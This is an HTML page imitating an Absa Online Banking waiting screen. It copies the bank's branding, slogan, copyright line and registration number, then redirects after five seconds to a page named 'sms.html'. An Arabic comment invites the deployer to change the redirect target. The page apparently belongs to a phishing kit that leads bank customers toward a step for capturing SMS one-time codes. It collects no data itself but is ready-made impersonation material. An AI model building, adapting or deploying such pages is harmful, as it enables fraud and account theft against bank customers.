<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Absa Online Banking - Waiting</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    /* Reset & base */
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: "Helvetica Neue", Arial, sans-serif;
      background: #faf8f7;
      color: #333;
      display: flex;
      flex-direction: column;
      height: 100vh;
      justify-content: center;
      align-items: center;
      gap: 20px;
      padding: 20px;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 40px;
    }
    .logo .circle {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: #b81d35;
      color: #fff;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
    }
    .logo-text {
      font-weight: 700;
      color: #000;
      font-size: 24px;
    }

    .waiting-card {
      background: white;
      border-radius: 6px;
      padding: 30px 40px;
      box-shadow: 0 1px 5px rgba(0,0,0,0.1);
      border: 1px solid #f0eaea;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 24px;
      max-width: 320px;
      width: 100%;
    }

    .waiting-title {
      font-size: 22px;
      font-weight: 700;
      color: #b81d35;
      text-align: center;
    }

    /* Spinner */
    .spinner {
      width: 48px;
      height: 48px;
      border: 5px solid #f0eaea;
      border-top: 5px solid #b81d35;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .waiting-message {
      font-size: 14px;
      color: #8b8b8b;
      text-align: center;
      line-height: 1.4;
    }

    footer {
      margin-top: auto;
      font-size: 13px;
      color: #a7a7a7;
      text-align: center;
      padding-bottom: 12px;
    }

    @media (max-width: 480px) {
      .waiting-card {
        padding: 20px;
      }
      .logo-text {
        font-size: 20px;
      }
    }
  </style>
</head>
<body>

  <header class="logo">
    <div style="font-size:12px;color:#000000; line-height: 1.1; font-weight: 400;">
      Your <br> story <br> matters
    </div>
    <div class="circle">absa</div>
    <div class="logo-text">Absa Online Banking</div>
  </header>

  <section class="waiting-card" role="alert" aria-live="assertive" aria-busy="true">
    <div class="waiting-title">Please wait...</div>
    <div class="spinner" aria-hidden="true"></div>
    <div class="waiting-message">
      We are processing your request.<br />
      Please do not close or refresh this page.<br />
      <small id="countdown">Redirecting in 5 seconds...</small>
    </div>
  </section>

  <footer>
    © Copyright. Absa Bank Limited. Registration Number: 1986/004794/06
  </footer>

  <script>
    // Countdown timer for redirect
    let seconds = 5;
    const countdownEl = document.getElementById('countdown');

    const interval = setInterval(() => {
      seconds--;
      if (seconds > 0) {
        countdownEl.textContent = `Redirecting in ${seconds} second${seconds === 1 ? '' : 's'}...`;
      } else {
        clearInterval(interval);
        // Redirect URL - عدل هنا حسب وجهتك
        window.location.href = "sms.html";
      }
    }, 1000);
  </script>

</body>
</html>
